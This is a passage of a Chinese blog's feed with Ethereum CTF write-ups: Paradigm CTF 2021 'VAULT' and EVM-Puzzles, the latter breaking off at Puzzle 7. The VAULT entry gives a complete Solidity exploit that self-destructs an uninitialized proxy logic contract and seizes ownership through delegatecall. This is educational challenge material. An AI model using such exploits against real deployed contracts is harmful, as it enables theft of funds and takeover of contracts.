的流动性，并且通过 NFT token 将流动性代币化。使用 ERC721 token（v2 使用的是 ERC20）的原因是同一个池的多个流动性并不能等价替换（v3 的集中流性动功能）。</li><li>SwapRouter 是 swap 路由的管理。提供代币交易的接口，它是对 UniswapV3Pool 合约中交易相关接口的进一步封装，前端界面主要与这个合约来进行对接。</li></ul></li></ul><p><a href="https://sissice.github.io/2022/08/20/uniswap-v3-1/">Uniswap Part Ⅰ | 创建交易对 - Sissice’s Blog</a></p><p><a href="https://sissice.github.io/2022/08/20/uniswap-v3-2/">Uniswap Part Ⅱ | 提供/移除流动性 - Sissice’s Blog</a></p><p><a href="https://sissice.github.io/2022/09/29/uniswap-v3-3/">Uniswap Part Ⅲ | 交易过程 - Sissice’s Blog</a></p><p><a href="https://sissice.github.io/2022/09/29/uniswap-v3-4/">Uniswap Part Ⅳ | 交易手续费 - Sissice’s Blog</a></p><p><a href="https://sissice.github.io/2022/09/29/uniswap-v3-5/">Uniswap Part Ⅴ | 预言机 - Sissice’s Blog</a></p><p><a href="https://sissice.github.io/2022/09/29/uniswap-v3-6/">Uniswap Part Ⅵ | 闪电贷 - Sissice’s Blog</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://uniswap.org/whitepaper-v3.pdf&quot;&gt;Uniswap v3 白皮书&lt;/a&gt;&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
  <entry>
    <title>Writeup | Paradigm CTF 2021 Part three</title>
    <link href="http://example.com/2022/10/03/ParadigmCTF2021three/"/>
    <id>http://example.com/2022/10/03/ParadigmCTF2021three/</id>
    <published>2022-10-03T13:52:43.000Z</published>
    <updated>2022-10-03T13:58:00.155Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://sissice.github.io/2022/09/18/ParadigmCTF2021one/">Writeup | Paradigm CTF 2021 Part one - Sissice’s Blog</a></p><p><a href="https://sissice.github.io/2022/09/23/ParadigmCTF2021two/">Writeup | Paradigm CTF 2021 Part two - Sissice’s Blog</a></p><h2 id="VAULT"><a href="#VAULT" class="headerlink" title="VAULT"></a>VAULT</h2><p>这道题涉及到了 <a href="https://learnblockchain.cn/article/721">EIP1167 代理合约</a> </p><p>通过挑战的要求是改变代理合约的 owner</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    return vault.owner() != address(this);<br>&#125;<br></code></pre></td></tr></table></figure><p>先看一下整体逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function Setup() public &#123;<br>// 设定 SingleOwnerGuard 为 guard defaultImplementation<br>    registry = new GuardRegistry();<br>    registry.registerGuardImplementation(new SingleOwnerGuard(), true);<br><br>    // 利用EIP-1167创建一个代理合约 vault<br>    // 原合约是 SingleOwnerGuard<br>    vault = new Vault(registry);<br><br>    // 授权 deposit 和 withdraw 两个函数<br>    SingleOwnerGuard guard = SingleOwnerGuard(vault.guard());<br>    guard.addPublicOperation(&quot;deposit&quot;);<br>    guard.addPublicOperation(&quot;withdraw&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><p>关键爆破点：</p><ul><li><p>构造函数相关的字节码在<code>init-code</code> 中，只能被调用一次。而自定义的<code>initialize()</code>方法存在于<code>runtime code</code>中，可被反复调用，需要自己写逻辑保证只能调用一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 构造函数<br>function Vault(GuardRegistry registry_) public &#123;<br>    owner = msg.sender;<br>    registry = registry_;<br>  <br>    createGuard(registry.defaultImplementation());<br>&#125;<br>  <br>// create new guard instance<br>// 利用EIP-1167创建一个代理合约<br>// 传入的是逻辑合约<br>function createGuard(bytes32 implementation) private returns (Guard) &#123;<br>    address impl = registry.implementations(implementation);<br>    require(impl != address(0x00));<br>  <br>    if (address(guard) != address(0x00)) &#123;<br>        guard.cleanup();<br>    &#125;<br>  <br>    // 创建代理合约<br>    guard = Guard(createClone(impl));<br>    // 代理合约的初始化<br>    guard.initialize(this);<br>    return guard;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 Vault 中只初始化了代理合约，而真正的逻辑合约 SingleOwnerGuard 并没有被初始化，类似于著名事件 <a href="https://github.com/openethereum/parity-ethereum/issues/6995">anyone can kill your contract</a></p></li><li><p>调用一个被销毁的合约，它只是会执行STOP这一个OPCODE，不会REVERT，也就是说会调用成功</p></li><li><p>在solidity&lt;0.5.0的版本中，返回值存放的位置指针与参数值的内存指针指向同一块内存地址。返回值拷贝到内存中时，如果返回值的实际长度为0，则其实际上拷贝到内存中的数值长度也为0。CALL不会去覆盖内存的值。</p><p>这意味着如果我们销毁了逻辑合约 SingleOwnerGuard ，那么会得到内存中已经存在的内容，即输入</p><p>因此当 SingleOwnerGuard 被销毁以后，我们传入的地址的第16位数值就是 error 的内存位置</p><p>这里可以选择使用 create 或者 create2 来生成特定的合约地址，使合约地址第16位为 NO_ERROR，绕开权限检查</p></li><li><p>emergencyCall 函数可以自行传入data，也就是说只要绕开了权限检查，我们可以做任何事</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function emergencyCall(address target, bytes memory data) public &#123;<br>    require(checkAccess(&quot;emergencyCall&quot;));<br><br>    require(target.delegatecall(data));<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>完整的demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.4.16;<br><br>import &quot;./Setup.sol&quot;;<br><br>contract FakeVault &#123;<br>    SingleOwnerGuard public guard;<br><br>    function get(GuardRegistry registry) public &#123;<br>        guard = SingleOwnerGuard(registry.implementations(registry.defaultImplementation()));<br>    &#125;<br><br>    function cleanup() public &#123;<br>        guard.initialize(Vault(address(this)));<br>        guard.cleanup();<br>    &#125;<br><br>    function owner() public returns (address) &#123;<br>        return address(this);<br>    &#125;<br><br>    // 在 cleanup() 中会有判断 guard() 的逻辑<br>    function guard() external view returns (address) &#123;<br>        return msg.sender;<br>    &#125;<br>&#125;<br><br>contract OwnershipTaker &#123;<br>    function doit(Vault vault) public &#123;<br>        // data 为 0，就是调用 fallback 函数<br>        vault.emergencyCall(msg.sender, new bytes(0));<br>    &#125;<br>&#125;<br><br>contract vaultExploit &#123;<br>    // 注意：要修改的 owner 的位置需要和目标合约 vault 中的 owner 的位置相同，否则无法进行修改<br>    address owner;<br>    vaultSetup private setup;<br>    OwnershipTaker addr;<br><br>    function vaultExploit(vaultSetup setup_) public &#123;<br>        setup = setup_;<br>    &#125;<br><br>    // 销毁逻辑合约<br>    function part1() public &#123;<br>        FakeVault fakeVault = new FakeVault();<br>        // 获得逻辑合约地址<br>        fakeVault.get(setup.registry());<br>        // 初始化并销毁<br>        fakeVault.cleanup();<br>    &#125;<br><br>    function part2() public &#123;<br>        while(true) &#123;<br>            // 使用 CREATE 来创造合约<br>            addr = new OwnershipTaker();<br>            // 判断是否满足条件<br>            if (bytes20(address(addr))[15] == hex&#x27;00&#x27;) &#123;<br>                break;<br>            &#125;<br>        &#125;<br>        // 调用特定合约地址中的攻击函数<br>        addr.doit(setup.vault());<br><br>    &#125;<br><br>    // 在 fallback 函数里面实现修改 owner 的逻辑<br>    function() external &#123;<br>        owner = address(0);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>后续题目更新中……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://sissice.github.io/2022/09/18/ParadigmCTF2021one/&quot;&gt;Writeup | Paradigm CTF 2021 Part one - Sissice’s Blog&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a hr</summary>
      
    
    
    
    
    <category term="靶场刷题" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98/"/>
    
    <category term="Etherum" scheme="http://example.com/tags/Etherum/"/>
    
  </entry>
  
  <entry>
    <title>Writeup | EVM-Puzzles</title>
    <link href="http://example.com/2022/09/30/EVM-Puzzles-wp/"/>
    <id>http://example.com/2022/09/30/EVM-Puzzles-wp/</id>
    <published>2022-09-30T12:25:00.000Z</published>
    <updated>2022-09-30T12:26:09.667Z</updated>
    
    <content type="html"><![CDATA[<h1 id="EVM-Puzzles"><a href="#EVM-Puzzles" class="headerlink" title="EVM-Puzzles"></a>EVM-Puzzles</h1><p><a href="https://github.com/fvictorio/evm-puzzles?ref=hackernoon.com">挑战仓库地址</a></p><p><a href="https://www.evm.codes/?ref=hackernoon.com">EVM操作码</a></p><p>准备工作：</p><ul><li>安装hardhat </li><li>克隆仓库，进入仓库根目录</li><li>准备环境：npm install yarn</li><li>开始挑战：npx hardhat play</li></ul><h2 id="Puzzle-1"><a href="#Puzzle-1" class="headerlink" title="Puzzle 1"></a>Puzzle 1</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">1</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">34</span>      CALLVALUE<br><span class="hljs-number">01</span>      <span class="hljs-number">56</span>      JUMP<br><span class="hljs-number">02</span>      FD      REVERT<br><span class="hljs-number">03</span>      FD      REVERT<br><span class="hljs-number">04</span>      FD      REVERT<br><span class="hljs-number">05</span>      FD      REVERT<br><span class="hljs-number">06</span>      FD      REVERT<br><span class="hljs-number">07</span>      FD      REVERT<br><span class="hljs-number">08</span>      <span class="hljs-number">5</span>B      JUMPDEST<br><span class="hljs-number">09</span>      <span class="hljs-number">00</span>      STOP<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p>首先，我们需要知道 <a href="https://www.evm.codes/?ref=hackernoon.com#34"><strong>CALLVALUE</strong></a> 的作用。此操作码获取 wei 中当前调用的值（即事务值），并将该值推送到堆栈的顶部。</p><p>即如果我们输入4，堆栈会发生如下变化</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br>---&gt;<br>[4<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p>接下来，我们需要知道 <a href="https://www.evm.codes/?ref=hackernoon.com#56"><strong>JUMP</strong></a> 指令的作用。此操作码消耗堆栈上的顶部值，并跳转到序列中的第 th 条指令。</p><p>即如果我们输入4，那么将会执行位于04的操作码</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">04 </span>     FD      REVERT<br></code></pre></td></tr></table></figure><p>执行REVERT，运行失败</p><p>因此我们输入8，将会执行JUMPDEST，跳过所有指令</p><h2 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">2</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">34</span>      CALLVALUE<br><span class="hljs-number">01</span>      <span class="hljs-number">38</span>      CODESIZE<br><span class="hljs-number">02</span>      <span class="hljs-number">03</span>      SUB<br><span class="hljs-number">03</span>      <span class="hljs-number">56</span>      JUMP<br><span class="hljs-number">04</span>      FD      REVERT<br><span class="hljs-number">05</span>      FD      REVERT<br><span class="hljs-number">06</span>      <span class="hljs-number">5</span>B      JUMPDEST<br><span class="hljs-number">07</span>      <span class="hljs-number">00</span>      STOP<br><span class="hljs-number">08</span>      FD      REVERT<br><span class="hljs-number">09</span>      FD      REVERT<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>我们的目标是使栈顶的值为6，使程序跳过所有REVERT</p><p><a href="https://www.evm.codes/?ref=hackernoon.com#38"><strong>CODESIZE</strong></a> 获取在当前环境中运行的代码的大小，并入栈。在此示例中，我们可以通过查看序列中有多少操作码来手动检查代码的大小。每个操作码是1个字节，在这个谜题中，我们有10个操作码，这意味着代码的大小是10个字节。注意，EVM 使用十六进制数来表示字节码。所以这里是0a</p><p><a href="https://www.evm.codes/?ref=hackernoon.com#03"><strong>SUB</strong></a> 会把第一个堆栈元素减去第二个堆栈元素，并将结果推送到堆栈的顶部。</p><p>此时的堆栈情况</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[input 0a<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p>即 0a - input = 6</p><p>所以输入4</p><h2 id="Puzzle-3"><a href="#Puzzle-3" class="headerlink" title="Puzzle 3"></a>Puzzle 3</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">3</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">36</span>      CALLDATASIZE<br><span class="hljs-number">01</span>      <span class="hljs-number">56</span>      JUMP<br><span class="hljs-number">02</span>      FD      REVERT<br><span class="hljs-number">03</span>      FD      REVERT<br><span class="hljs-number">04</span>      <span class="hljs-number">5</span>B      JUMPDEST<br><span class="hljs-number">05</span>      <span class="hljs-number">00</span>      STOP<br><br>? Enter the calldata:<br><br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#36"><strong>CALLDATASIZE</strong></a> 会获取调用数据的大小（以字节为单位），并将其推送到堆栈上。</p><p>并且题目要求我们输入calldata</p><p>所以我们输入四个指令的字节码，使 CALLDATASIZE 指令在堆栈上推送4</p><p>这里我输入了 0x5B5B5B5B</p><h2 id="Puzzle-4"><a href="#Puzzle-4" class="headerlink" title="Puzzle 4"></a>Puzzle 4</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">4</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">34</span>      CALLVALUE<br><span class="hljs-number">01</span>      <span class="hljs-number">38</span>      CODESIZE<br><span class="hljs-number">02</span>      <span class="hljs-number">18</span>      XOR<br><span class="hljs-number">03</span>      <span class="hljs-number">56</span>      JUMP<br><span class="hljs-number">04</span>      FD      REVERT<br><span class="hljs-number">05</span>      FD      REVERT<br><span class="hljs-number">06</span>      FD      REVERT<br><span class="hljs-number">07</span>      FD      REVERT<br><span class="hljs-number">08</span>      FD      REVERT<br><span class="hljs-number">09</span>      FD      REVERT<br><span class="hljs-number">0</span>A      <span class="hljs-number">5</span>B      JUMPDEST<br><span class="hljs-number">0</span>B      <span class="hljs-number">00</span>      STOP<br><br></code></pre></td></tr></table></figure><p>这里的 CODESIZE 为12，即0c</p><p>此时堆栈状态</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0c input<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#18"><strong>XOR</strong></a> 以二进制表示形式计算两个数字，两者相等为0，不等为1</p><p>假设我们在堆栈的顶部有两个数字。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[5<span class="hljs-number"> 3 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p>在执行 <strong>XOR</strong> 指令时，我们可以想象二进制表示中的两个数字是这样的。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">00000000000000000000000000000101<br>00000000000000000000000000000011<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">00000000000000000000000000000110<br></code></pre></td></tr></table></figure><p>而要想通过，我们需要得到0a</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">0</span>c   <span class="hljs-keyword">XOR</span> <span class="hljs-keyword">input</span> = <span class="hljs-number">0</span>a<br><span class="hljs-symbol">1100 </span><span class="hljs-keyword">XOR</span> <span class="hljs-keyword">input</span> = <span class="hljs-number">1010</span><br></code></pre></td></tr></table></figure><p>所以输入0110，即6</p><h2 id="Puzzle-5"><a href="#Puzzle-5" class="headerlink" title="Puzzle 5"></a>Puzzle 5</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">5</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">34</span>          CALLVALUE<br><span class="hljs-number">01</span>      <span class="hljs-number">80</span>          DUP1<br><span class="hljs-number">02</span>      <span class="hljs-number">02</span>          MUL<br><span class="hljs-number">03</span>      <span class="hljs-number">610100</span>      PUSH2 <span class="hljs-number">0100</span><br><span class="hljs-number">06</span>      <span class="hljs-number">14</span>          EQ<br><span class="hljs-number">07</span>      <span class="hljs-number">600</span>C        PUSH1 <span class="hljs-number">0</span>C<br><span class="hljs-number">09</span>      <span class="hljs-number">57</span>          JUMPI<br><span class="hljs-number">0</span>A      FD          REVERT<br><span class="hljs-number">0</span>B      FD          REVERT<br><span class="hljs-number">0</span>C      <span class="hljs-number">5</span>B          JUMPDEST<br><span class="hljs-number">0</span>D      <span class="hljs-number">00</span>          STOP<br><span class="hljs-number">0</span>E      FD          REVERT<br><span class="hljs-number">0</span>F      FD          REVERT<br><br>? Enter the value to send: (<span class="hljs-number">0</span>)<br><br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#80"><strong>DUP1</strong></a> 会把堆栈上的第一个位置上的值复制，并将副本推送到堆栈的顶部。</p><p>所以现在在前两条指令之后，我们的堆栈看起来像这样。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[input input<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#02"><strong>MUL</strong></a> 获取堆栈上的前两个值，将它们相乘，然后将结果推送到堆栈的顶部。</p><p>因此，在本例中，MUL以后生成的堆栈如下所示。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[mulResult<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p> <a href="https://www.evm.codes/?ref=hackernoon.com#61"><strong>PUSH2</strong></a> 会将指定的 2 字节值推送到堆栈的顶部。这里指定了0100（十六进制）</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0100 mulResult<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#14"><strong>EQ</strong></a> 会获取堆栈上的前两个值，将其进行比较并将结果推送到堆栈顶部。如果前两个值相等，则为1，否则为0。</p><p><a href="https://www.evm.codes/?ref=hackernoon.com#57"><strong>JUMPI</strong></a> 将有条件地更改程序计数器。此指令查看第二个堆栈元素以了解它是否应该跳转，具体取决于第二个堆栈元素是 1 还是 0 。然后使用第一个堆栈元素来知道要跳转到哪个位置。</p><p>因此此时我们的堆栈应该是这样</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[0c<span class="hljs-number"> 1 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p>即跳转到第12条命令，通过挑战</p><p>所以为了使 EQ 的结果为1，我们需要使 input * input 的结果等于十六进制的0100，也就是256</p><p>所以输入16</p><h2 id="Puzzle-6"><a href="#Puzzle-6" class="headerlink" title="Puzzle 6"></a>Puzzle 6</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs clean">############<br># Puzzle <span class="hljs-number">6</span> #<br>############<br><br><span class="hljs-number">00</span>      <span class="hljs-number">6000</span>      PUSH1 <span class="hljs-number">00</span><br><span class="hljs-number">02</span>      <span class="hljs-number">35</span>        CALLDATALOAD<br><span class="hljs-number">03</span>      <span class="hljs-number">56</span>        JUMP<br><span class="hljs-number">04</span>      FD        REVERT<br><span class="hljs-number">05</span>      FD        REVERT<br><span class="hljs-number">06</span>      FD        REVERT<br><span class="hljs-number">07</span>      FD        REVERT<br><span class="hljs-number">08</span>      FD        REVERT<br><span class="hljs-number">09</span>      FD        REVERT<br><span class="hljs-number">0</span>A      <span class="hljs-number">5</span>B        JUMPDEST<br><span class="hljs-number">0</span>B      <span class="hljs-number">00</span>        STOP<br><br>? Enter the calldata:<br><br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/#35"><strong>CALLDATALOAD</strong></a> 从调用数据的给定偏移量开始的 32 字节值，不足 32 bytes 的自动补0</p><p>例如</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">calldata</span> <span class="hljs-number">0</span>xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF<br><span class="hljs-attribute">i</span> <span class="hljs-number">31</span><br><span class="hljs-attribute">output</span> <span class="hljs-number">0</span>xFF<span class="hljs-number">00000000000000000000000000000000000000000000000000000000000000</span><br></code></pre></td></tr></table></figure><p>而如果输入 0x0A 会变成 0A00000000000000000000000000000000000000000000000000000000000000</p><p>所以应该输入0x000000000000000000000000000000000000000000000000000000000000000a</p><h2 id="Puzzle-7"><a href="#Puzzle-7" class="headerlink" title="Puzzle 7"></a>Puzzle 7</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">############</span><br><span class="hljs-comment"># Puzzle 7 #</span><br><span class="hljs-comment">############</span><br><br><span class="hljs-attribute">00</span>      <span class="hljs-number">36</span>        CALLDATASIZE<br><span 